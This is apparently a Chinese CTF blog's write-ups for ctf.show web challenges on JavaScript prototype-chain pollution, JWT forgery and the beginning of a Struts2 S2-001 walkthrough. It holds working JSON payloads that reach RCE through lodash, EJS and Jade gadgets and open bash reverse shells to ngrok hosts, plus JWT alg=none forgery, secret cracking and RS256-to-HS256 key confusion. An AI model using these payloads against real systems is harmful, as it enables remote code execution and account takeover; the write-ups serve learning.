title="原型链污染"></a>原型链污染</h3><p>foo.__proto__指向的是Foo类中的prototype.那么,如果我们修改了foo.__proto__中的值,是不是就可以修改Foo类</p><pre><code class="java">//foo是一个简单的javascript对象let foo = &#123;bar:1&#125;//foo.bar此时为1console.log(foo.bar)//修改foo的原型(即object)foo.__proto__.bar = 2//由于查找顺序的愿意,foo.bar依然是1console.log(foo.bar)//此时在用object创建一个空的zoo对象let zoo = &#123;&#125;//查看zoo.barconsole.log(zoo.bar)</code></pre><p>虽然zoo是一个空对象{},但是zoo.bar的结果是2</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413141325570.png" alt="image-20220413141325570"></p><p>显然我们前面修改了foo的原型foo._<em>proto</em>_.bar &#x3D; 2 ,而foo是一个object类的实例,所以实际上是修改了object这个类,给这个类增加了一个属性bar,值为2.后来我们又用object类创建了一个zoo对象let zoo &#x3D; {},zoo对象自然也有一个bar属性了.那么在一个应用中,如果攻击者控制并修改了一个对象的原型,那么将可以影响所有和这个对象来自同一个类,父类的对象,</p><h3 id="哪些情况下原型链会有污染呢"><a href="#哪些情况下原型链会有污染呢" class="headerlink" title="哪些情况下原型链会有污染呢"></a>哪些情况下原型链会有污染呢</h3><p>找找能够控制数组(对象)的”键名”操作就好</p><ul><li>对象merge</li><li>对象clone(其实内核就是将待操作对象merge到一个空对象中)</li></ul><pre><code class="java">function merge(target,source)&#123;    for(let key in source)&#123;        if (key in source &amp;&amp; key in target)&#123;            merge(target[key],source[key])        &#125;else&#123;            target[key] = source[key]        &#125;    &#125;&#125;</code></pre><p>在合并的时候,存在赋值的操作target[key] &#x3D; source[key],那么这个key如果是_<em>proto</em>_,是不是可以原型链污染呢</p><pre><code class="java">let o1 = &#123;&#125;let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b:2&#125;&#125;merge(o1,o2)console.log(o1.a,o2.b)o3 = &#123;&#125;console.log(o3.b)</code></pre><p>合并虽然成功了,但是原型链并没有污染</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413144531611.png" alt="image-20220413144531611"></p><p>这是因为,我们用javascript创建o2的过程(let o2 &#x3D; {a: 1,”__proto__”:{b:2}})中,__proto__已经代表了o2的原型,此时遍历o2所有的键名,拿到的是[a,b],__proto__并不是一个key,自然也不会修改object的原型</p><pre><code class="javascript">let o1 = &#123;&#125;let o2 = JSON.parse(&#39;&#123;&quot;a&quot;:1,&quot;__proto__&quot;:&#123;&quot;b&quot;:2&#125;&#125;&#39;)merge(o1,o2)console.log(o1.a,o2.b)o3 = &#123;&#125;console.log(o3.b)</code></pre><p>可见，新建的o3对象，也存在b属性，说明Object已经被污染</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413145041912.png" alt="image-20220413145041912"></p><p>这是因为,JSON解析的情况下,__proto__会被认为是一个真正的键名,而不是代表原型,所以在遍历o2的时候会存在这个键</p><p>merge操作是最常见可控键名的操作,也最能被原型链攻击,很多库都存在这个问题</p><h3 id="Code-Breaking-2018-Thejs-分析"><a href="#Code-Breaking-2018-Thejs-分析" class="headerlink" title="Code-Breaking 2018 Thejs 分析"></a>Code-Breaking 2018 Thejs 分析</h3><pre><code class="JavaScript">// ...const lodash = require(&#39;lodash&#39;)// ...app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; // define the template engine    fs.readFile(filePath, (err, content) =&gt; &#123;        if (err) return callback(new Error(err))        let compiled = lodash.template(content)        let rendered = compiled(&#123;...options&#125;)        return callback(null, rendered)    &#125;)&#125;)//...app.all(&#39;/&#39;, (req, res) =&gt; &#123;    let data = req.session.data || &#123;language: [], category: []&#125;    if (req.method == &#39;POST&#39;) &#123;        data = lodash.merge(data, req.body)        req.session.data = data    &#125;    res.render(&#39;index&#39;, &#123;        language: data.language,         category: data.category    &#125;)&#125;)</code></pre><p>lodash是为了弥补javascript原生函数功能不足而提供的一个辅助功能集,其中包含字符串,数组 对象等操作,这个web应用中,使用了loadsh提供的两个工具</p><ol><li>lodash.template 一个简单的模板引擎</li><li>lodash.merge函数或对象的合并</li></ol><p>其实整个应用的逻辑很简单,用户提交的信息,用merge方法合并到session里,多次提交,session里最终保存你提交的所有信息.</p><p>而这里的lodash.template的代码<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p><pre><code class="javascript">// Use a sourceURL for easier debugging.var sourceURL = &#39;sourceURL&#39; in options ? &#39;//# sourceURL=&#39; + options.sourceURL + &#39;\n&#39; : &#39;&#39;;// ...var result = attempt(function() &#123;  return Function(importsKeys, sourceURL + &#39;return &#39; + source)  .apply(undefined, importsValues);&#125;);</code></pre><p>options是一个对象,sourceurl取到了其options.sourceurl属性.这个属性本来是没有赋值的默认取空字符串</p><p>但是因为原型链污染,我们可以给所有的object对象中插入一个sourceurl属性,这个sourceurl被拼接进new Function的第二个参数中,造成任意代码执行漏洞.</p><p>我们将带有__proto__的payload以json的形式发送给后端,因为express框架支持根据content-type来解析请求的body</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413150214879.png" alt="image-20220413150214879"></p><p>回到本题,下载下来就是一堆文件,我们直接搜索flag</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413153317715.png" alt="image-20220413153317715"></p><p>这里有一个copy函数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413154519891.png" alt="image-20220413154519891"></p><p>这里的secert是没有ctfshow属性,那么我们可以利用copy方法对其进行原型链污染,即给secert的object增加一个ctfshow为36dboy</p><pre><code>&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413160253517.png" alt="image-20220413160253517"></p><h1 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h1><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p><a href="https://xz.aliyun.com/t/7184">ejs rce</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413160909360.png" alt="image-20220413160909360"></p><p>这里显然是不可能相等的,当然这里还是存在原型链污染</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413161012408.png" alt="image-20220413161012408"></p><p>这里存在一个api.当post方式访问&#x2F;api时，会执行后面的Function(query)(query)当post方式访问&#x2F;api时，会执行后面的Function(query)(query)</p><pre><code>&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/6.tcp.ngrok.io/19625 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413161347053.png" alt="image-20220413161347053"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413161434931.png" alt="image-20220413161434931"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413162750753.png" alt="image-20220413162750753"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413172237644.png" alt="image-20220413172237644"></p><h1 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h1><h2 id="原型链污染两级反弹shell"><a href="#原型链污染两级反弹shell" class="headerlink" title="原型链污染两级反弹shell"></a>原型链污染两级反弹shell</h2><pre><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/0.tcp.ngrok.io/15600 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413164819178.png" alt="image-20220413164819178"></p><h1 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h1><p>预期解ejs rce</p><pre><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/6.tcp.ngrok.io/11125 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;&#125;</code></pre><p>然后再随便访问一下页面就能触发rce</p><h1 id="web342"><a href="#web342" class="headerlink" title="web342"></a>web342</h1><p>jade原型链污染<a href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p><pre><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/6.tcp.ngrok.io/11125&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></pre><p>在login页面打上去之后随便访问下，就会反弹</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT</title>
      <link href="/ctfshow/ctf.show/JWT/"/>
      <url>/ctfshow/ctf.show/JWT/</url>
      
        <content type="html"><![CDATA[<h1 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h1><h2 id="什么是jwt"><a href="#什么是jwt" class="headerlink" title="什么是jwt"></a>什么是jwt</h2><p>jwt是一个开放标准,它定义的一种紧凑的 自包含的方式,用于所谓json对象在各方之间安全的传输信息.该信息可以被验证和信任,因为它是数字签名的.</p><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ul><li><p>一次性验证</p><p>  比如用户注册后需要发放一封邮件让其激活账户,通常邮件中只需要有一个链接,这个链接需要具备以下的特性:能够标识用户,该链接具有时效性(通常只允许几个小时内激活),不能被篡改其激活其他可能的账户..这种场景就和jwt的特性非常 的贴近,jwt的payload中固定的参数:iis签发这和exp过期时间正式为其准备的</p></li><li><p>restful api的无状态认证</p><p>  使用jwt来做restful api的身份认证也是值得推崇的一种使用方案.客户端和服务器共享secret;过期时间有服务端效验,客户端定时刷新;签名信息不可被更改,spring security oauth jwt 提供了一套完整的jwt认证体系</p></li></ul><h2 id="jwt结构"><a href="#jwt结构" class="headerlink" title="jwt结构"></a>jwt结构</h2><p>jwt由三部分构成,他们之间用远点(.)连接.这三部分分别是</p><ul><li>Header</li><li>Payload</li><li>Signature</li></ul><p>具体示例如下</p><pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</code></pre><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>jwt的头部由两部分信息组成</p><ul><li>type:声明类型,这里是jwt</li><li>alg:声明加密的算法 通常直接使用HMAC SHA256</li></ul><p>完整的头部信息如下</p><pre><code>&#123;  &quot;type&quot;:&quot;jwt&quot;,  &quot;alg&quot;:&quot;HS256&quot;&#125;</code></pre><p>对头部信息进行base64编码得到第一部分信息</p><pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</code></pre><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>载荷就是存放有效信息的地方,它包含声明要求.声明有三种类型</p><ul><li>registered claims:标准中注册的声明,这里有一组预定义的声明,他们不是强制的,但是推荐</li><li>public  claims:公共的声明</li><li>private claims:私有的声明</li></ul><p>标准中注册的声明</p><ul><li>iss: jwt签发者</li><li>sub: jwt所面向的用户</li><li>aud: 接收jwt的一方</li><li>exp: jwt的过期时间，这个过期时间必须要大于签发时间</li><li>nbf: 定义在什么时间之前，该jwt都是不可用的</li><li>iat: jwt的签发时间</li><li>jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击</li></ul><p>公共的声明:</p><p>公共的声明可以添加任何信息,一般添加用户的相关信息或者其他业务需要的必要信息,但是不建议添加敏感信息,因为该部分可以在客户端解密</p><p>私有的声明:</p><p>私有声明是提供者和消费者所共同定义的声明,一般不建议存放敏感信息,因为base64是对称解密的,意味着该部分信息可以归类为明文信息</p><p>对payload进行base64加密得到了jwt的第二部分内容</p><h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>jwt的第三部分是一个签证信息,这个签证信息由三部分组成:</p><ul><li>header(base64)</li><li>payload(base64)</li><li>secret</li></ul><p>第三部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串,然后通过header中声明的加密凡是进行加盐secret组合加密,然后就构成了jwt的第三部分</p><p>注意</p><p>secret是保存在服务器端的,jwt的签发生成也是在服务器端的,secret就是用来进行jwt的签发和jwt的验证.所以它就是你服务端的私钥,在任何场景都不应该泄露出去.一旦客户端得知增secret,那么就意味着客户端可以自我签发jwt了</p><p><a href="https://www.jianshu.com/p/4a124a10fcaf">https://www.jianshu.com/p/4a124a10fcaf</a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281508057.png" alt="image-20220328150821999"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281508209.png" alt="image-20220328150828162"></p><p>这里提示访问admin文件夹</p><p>要注意使用 url 访问网页时<br>&#x2F;admin    表示访问 admin.php 文件<br>&#x2F;admin&#x2F;    表示访问 admin&#x2F;目录下的文件，默认是 index.php<br>很像文件夹，所以此处应该访问 &#x2F;admin&#x2F;</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281508710.png" alt="image-20220328150840662"></p><p>cookie看着像<a href="https://jwt.io/">jwt</a></p><pre><code>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0A.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NDg0NTY0OTksImV4cCI6MTY0ODQ2MzY5OSwibmJmIjoxNjQ4NDU2NDIyMjI5OSwic3ViIjoiYWRtaW4ifV0</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281510851.png" alt="image-20220328151007774"></p><p>alg加密算法为none</p><p>sub为user改为admin重新登录下试试</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281625373.png" alt="image-20220328162550323"></p><pre><code>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281725039.png" alt="image-20220328172517993"></p><pre><code>[&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1648459436,&quot;exp&quot;:1648466636,&quot;nbf&quot;:1648459436,&quot;sub&quot;:&quot;admin&quot;,&quot;jti&quot;:&quot;8b158096b6e36731237170f44d95d21f&quot;&#125;]</code></pre><p>合起来,很奇怪这里执行不成功</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281752414.png" alt="image-20220328175237361"></p><p>前面删了才能执行成功,感觉是不是环境的问题</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281752207.png" alt="image-20220328175246153"></p><h1 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311626070.png" alt="image-20220331162629981"></p><pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0ODcxNTE4MywiZXhwIjoxNjQ4NzIyMzgzLCJuYmYiOjE2NDg3MTUxODMsInN1YiI6InVzZXIiLCJqdGkiOiJkM2Y3YjhiOTA3YWE1M2UyZTA3MTlmOWY0MTQ3ZmFiYSJ9.Zyy2DOiFSao6aLvThffBR4ZYCShY9wLwN2rjelgn-3o</code></pre><p>第一段</p><pre><code>&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</code></pre><p>sh256加密</p><p>第二段</p><pre><code>&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1648715183,&quot;exp&quot;:1648722383,&quot;nbf&quot;:1648715183,&quot;sub&quot;:&quot;user&quot;,&quot;jti&quot;:&quot;d3f7b8b907aa53e2e0719f9f4147faba&quot;&#125;</code></pre><p>前面算法保证了jwt在传输的过程中不被恶意用户修改,但是header中的alg字段可被修改为none,一些jwt库支持none算法,即使没有签名算法,当alg为none时后端不会进行签名校验,将alg修改为none之后,去掉jwt中的signature数据,只剩header.payload.(这里的.不是句号哦).然后提交到服务端即可</p><p>修改</p><pre><code>&#123;&quot;alg&quot;:&quot;None&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0</code></pre><pre><code>&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1648715183,&quot;exp&quot;:1648722383,&quot;nbf&quot;:1648715183,&quot;sub&quot;:&quot;admin&quot;,&quot;jti&quot;:&quot;d3f7b8b907aa53e2e0719f9f4147faba&quot;&#125;eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0ODcxNTE4MywiZXhwIjoxNjQ4NzIyMzgzLCJuYmYiOjE2NDg3MTUxODMsInN1YiI6ImFkbWluIiwianRpIjoiZDNmN2I4YjkwN2FhNTNlMmUwNzE5ZjlmNDE0N2ZhYmEifQ</code></pre><pre><code>eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0ODcxNTE4MywiZXhwIjoxNjQ4NzIyMzgzLCJuYmYiOjE2NDg3MTUxODMsInN1YiI6ImFkbWluIiwianRpIjoiZDNmN2I4YjkwN2FhNTNlMmUwNzE5ZjlmNDE0N2ZhYmEifQ.</code></pre><p>记得访问&#x2F;admin&#x2F;页面哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311634328.png" alt="image-20220331163435158"></p><h1 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404222258525.png" alt="image-20220404222258525"></p><h2 id="c-jwt-cracker"><a href="#c-jwt-cracker" class="headerlink" title="c-jwt-cracker"></a><a href="https://www.ape-ask.com/go.html?url=aHR0cHM6Ly9naXRodWIuY29tL2JyZW5kYW4tcml1cy9jLWp3dC1jcmFja2Vy">c-jwt-cracker</a></h2><p>先安docker</p><pre><code>docker build . -t jwtcrack</code></pre><pre><code>docker run -it --rm  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0OTA4MTgyOSwiZXhwIjoxNjQ5MDg5MDI5LCJuYmYiOjE2NDkwODE4MjksInN1YiI6InVzZXIiLCJqdGkiOiJkNWM2Yjg5MTBjYjMzZmZkZTVkN2NlNzRiM2E1ZTllNiJ9.4SRvUVI8lQ_yfMrKsSVcjnQvFEojGt0LvXu4gkX4amY 1234567890</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404224055707.png" alt="image-20220404224055707"></p><p>这里定义密钥为数字快一点</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404224214524.png" alt="image-20220404224214524"></p><p>改一下拿去访问&#x2F;admin&#x2F;就好</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404224205379.png" alt="image-20220404224205379"></p><h1 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h1><pre><code>docker run -it --rm  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0OTA4MzM5OSwiZXhwIjoxNjQ5MDkwNTk5LCJuYmYiOjE2NDkwODMzOTksInN1YiI6InVzZXIiLCJqdGkiOiIwOTJlMTBhMzJlOTY2ZDY2NGM4MWMzM2QyMjlhMzY4ZSJ9.lLsYI7NGjbb4xdzmyR1YkPSgcksnBiNm4eWmVqQ2Q2U asdfghjklpoiuytrewqzxcvbnm0987654321</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404224420522.png" alt="image-20220404224420522"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404224444069.png" alt="image-20220404224444069"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404224459271.png" alt="image-20220404224459271"></p><h1 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h1><pre><code class="javascript">给了一个aap.js/* GET home page. */router.get(&#39;/&#39;, function(req, res, next) &#123;  res.type(&#39;html&#39;);  var privateKey = fs.readFileSync(process.cwd()+&#39;//public//private.key&#39;);  var token = jwt.sign(&#123; user: &#39;user&#39; &#125;, privateKey, &#123; algorithm: &#39;RS256&#39; &#125;);  res.cookie(&#39;auth&#39;,token);  res.end(&#39;where is flag?&#39;);  &#125;);router.post(&#39;/&#39;,function(req,res,next)&#123;    var flag=&quot;flag_here&quot;;    res.type(&#39;html&#39;);    var auth = req.cookies.auth;    var cert = fs.readFileSync(process.cwd()+&#39;//public/public.key&#39;);  // get public key    jwt.verify(auth, cert, function(err, decoded) &#123;      if(decoded.user===&#39;admin&#39;)&#123;          res.end(flag);      &#125;else&#123;          res.end(&#39;you are not admin&#39;);      &#125;    &#125;);&#125;)</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405094524472.png" alt="image-20220405094524472"></p><p>是rs256加密,有公钥和私钥,从app.py文件中可以看到从public&#x2F;private.key读取了私钥</p><pre><code>https://f86be22f-fd82-48a7-a764-23d8f76ecd98.challenge.ctf.show//private.key</code></pre><p>试一下在这个目录下下载了私钥</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405094815009.png" alt="image-20220405094815009"></p><p>接着有两种方法,一是得到私钥和公钥解密加密.二是用私钥自己生成公钥</p><p>jwt.io网站解不了,用python了</p><pre><code># python3import jwtpublic = open(&#39;private.key&#39;, &#39;r&#39;).read()payload=&#123;&quot;user&quot;:&quot;admin&quot;&#125;print(jwt.encode(payload, key=public, algorithm=&#39;RS256&#39;))eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.AH4YkjLWhtkoxco48abhQ7MUfxBgyfP3OffsS6cZmHtfLpVlv9t8bZAnW-CVbLkHfu4vzQI_OiPdBQP-a3xJIOq3hf0jsMAsijn-XKaaDZtv3cg4a0RvjpEHLYCN89KpigGHC0vtOb6OzffdmkPVN8vcYJby742vD_YhDDHw6pU</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405101247457.png" alt="image-20220405101247457"></p><p>这次是用post访问原始目录</p><p>自己安装node.js并安装jsonwebtoken库</p><pre><code> npm install jsonwebtoken --save</code></pre><p>运行node.js</p><pre><code>node</code></pre><p>传入下面的值,要在private.key目录运行node哦</p><pre><code>const jwt = require(&#39;jsonwebtoken&#39;);var fs = require(&#39;fs&#39;);var privateKey = fs.readFileSync(&#39;private.key&#39;);var token = jwt.sign(&#123; user: &#39;admin&#39; &#125;, privateKey, &#123; algorithm: &#39;RS256&#39; &#125;);console.log(token)</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405102051057.png" alt="image-20220405102051057"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405102156452.png" alt="image-20220405102156452"></p><h1 id="web350"><a href="#web350" class="headerlink" title="web350"></a>web350</h1><p>给了源码包,只有一个公钥</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405102424298.png" alt="image-20220405102424298"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405102355152.png" alt="image-20220405102355152"></p><p>同样的加密</p><p>将 RS256 算法改为 HS256（非对称密码算法&#x3D;&gt;对称密码算法）</p><pre><code>HS256算法使用密钥为所有消息进行签名和验证而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名这样的话，后端代码使用RSA公钥+HS256算法进行签名验证</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405102757993.png" alt="image-20220405102757993"></p><p>记得替换一下原先目录下的公钥文件哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405102802757.png" alt="image-20220405102802757"></p><pre><code>破解HS256（对称加密算法）密钥    如果HS256密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥，例如将密钥字符串用作PyJWT库示例代码中的密钥的时候情况就是如此。    然后，用蛮力方式对密钥进行猜解，具体方法很简单：如果密钥正确的话，解密就会成功；如果密钥错误的话，解密代码就会抛出异常。    此外，我们也可以使用PyJWT或John Ripper进行破解测试。    附录：相关工具    PyJWT库具体地址为：https://github.com/jpadilla/pyjwt。    &gt;&gt;&gt; import jwt    &gt;&gt;&gt; encoded = jwt.encode(&#123;&#39;some&#39;: &#39;payload&#39;&#125;, &#39;secret&#39;, algorithm=&#39;HS256&#39;)  &#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.4twFt5NiznN84AWoo1d7KO1T_yoc0Z6XOpOVswacPZg&#39;    &gt;&gt;&gt; jwt.decode(encoded, &#39;secret&#39;, algorithms=[&#39;HS256&#39;])    &#123;&#39;some&#39;: &#39;payload&#39;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java</title>
      <link href="/ctfshow/ctf.show/java/"/>
      <url>/ctfshow/ctf.show/java/</url>
      
        <content type="html"><![CDATA[<h1 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271215561.png" alt="image-20220327121545509"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271215318.png" alt="image-20220327121553262"></p><p>发现一个链接,直接点过去</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271216806.png" alt="image-20220327121656757"></p><p>查看源码,发现一个链接</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271219406.png" alt="image-20220327121913334"></p><p>发现服务器500错误,得知是struts2框架</p><p>struts2框架是用java语言编写的一个基于MVC这几模式的web应用框架,关于struts2漏洞</p><p>判断是struts2框架的方法</p><ol><li>通过页面的回显错误消息来判断,页面不回显错误消息是则无效</li><li>通过网页后缀来判断,如.do.action,有可能不准</li><li>判断&#x2F;struts&#x2F;webconsole.html是否存在来进行判断,需要devMode为true</li></ol><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>通过actionErrors.要求是对应的Action需要继承自ActionSupport类,</p><pre><code>原始url为https://threathunter.org/        则检测所用的url为https://threathunter.org/?actionErrors=111</code></pre><p>如果返回的页面出现异常,则可以认定为目标是基于struts2构建的.异常包括但不限于</p><ol><li>页面直接出现404或者500等错误</li><li>页面上输出了与业务有关错误消息,或者1111被回显到了页面上</li><li>页面内容结构发生了明显的改变</li><li>页面发生了重定向</li></ol><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>通过CheckboxInterceptor.</p><p>要求:需要有一个能够回显到页面上的字符串类型的参数,一般就是各个目标的搜索功能,搜索功能往往会将keyword回显到页面上</p><pre><code>原始url: https://threathunter.org/?keyword=aaa,且页面回显出了aaa        检测url: https://threathunter.org/?__checkbox_keyword=aaa,如果返现回显变成了false,则可以认定目标是基于struts2开发的</code></pre><p>原理是CheckboxInterceptor发现了一个名为__checkbox_keyword的参数,但是没有发现keyword参数,则他会添加一个keyword参数,并将其值设置为false</p><p>回到本题,s2-001是一个struts2命令执行漏洞编号,</p><h2 id="这里复现一下struts2漏洞s2-001"><a href="#这里复现一下struts2漏洞s2-001" class="headerlink" title="这里复现一下struts2漏洞s2-001"></a>这里复现一下struts2漏洞s2-001</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>struts2漏洞s2-001是当用户提交表单数据且验证失败时,服务器使用OGNL表达式解析用户先前提交的参数值,%{value}并重新填充响应的表单数据,例如,在注册或登录页面中,如果提交失败,则服务器通常默认情况下将返回先前提交的数据.由于服务器用于%{value}对提交的数据执行OGNL表达式解析,因此服务器可以直接发送有效载荷看来执行命令</p><h3 id="vulhub漏洞利用"><a href="#vulhub漏洞利用" class="headerlink" title="vulhub漏洞利用"></a>vulhub漏洞利用</h3><h4 id="docker正式安装"><a href="#docker正式安装" class="headerlink" title="docker正式安装"></a>docker正式安装</h4><p>确保 yum 包更新到最新</p><pre><code>yum update</code></pre><p>卸载旧版本（如果安装过旧版本的话）</p><pre><code>yum remove docker  docker-common docker-selinux 